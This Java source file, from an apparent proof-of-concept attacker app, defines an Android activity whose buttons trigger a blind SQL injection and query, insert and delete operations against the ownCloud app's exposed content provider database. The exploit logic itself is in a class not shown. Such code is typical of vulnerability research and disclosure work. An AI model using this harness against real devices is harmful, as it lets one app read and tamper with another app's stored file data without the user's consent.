package com.attacker.app.opencloud;

import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.attacker.app.R;

public class OwncloudProviderExploitActivity extends AppCompatActivity {

    // Modifiable parameters
    final static String tableName = "filelist";
    final static String columnName = "filename";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.owncloud_listfile_exploit);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Button blindSqlBtn = findViewById(R.id.blindSqlButton);
        Button queryBtn = findViewById(R.id.ocQueryButton);
        Button insertBtn = findViewById(R.id.ocInsertButton);
        Button deleteBtn = findViewById(R.id.ocDeleteButton);

        TextView queryResultTextView = findViewById(R.id.ocResult);
        queryResultTextView.setMovementMethod(new ScrollingMovementMethod());

        EditText deleteIdTextBox = findViewById(R.id.deleteId);

        // Blind SQL Exploit
        blindSqlBtn.setOnClickListener(view->{
            Toast.makeText(this, "Blind Exploit Triggered, output will be displayed on TextView shortly.", Toast.LENGTH_SHORT).show();
            String blindSqlResult = OwncloudProviderExploit.blindExploit(this);

            queryResultTextView.setText(blindSqlResult);
        });

        // Query Exposed DB
        queryBtn.setOnClickListener(view->{
            try {
                String result = OwncloudProviderExploit.queryExposedDb(this);
                queryResultTextView.setText(result);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        });

        // Insert Fixed String into DB
        insertBtn.setOnClickListener(view->{
            try {
                OwncloudProviderExploit.insertIntoExposedDb(this, columnName, tableName);
                Toast.makeText(this, "Inserted 'a'", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        });

        // Delete specific string in DB
        deleteBtn.setOnClickListener(view->{

            try {
                int deleteId = Integer.parseInt(deleteIdTextBox.getText().toString());  // Try to convert to an integer
                OwncloudProviderExploit.deleteSpecificIdFromExposedDb(this, deleteId);
                deleteIdTextBox.setText("");
                Toast.makeText(this, "Deleted target id.", Toast.LENGTH_SHORT).show();

            } catch (NumberFormatException e) {
                // If the input is not a valid integer, show a Toast message
                Toast.makeText(this, "Please enter a valid integer", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

        });

    }
}
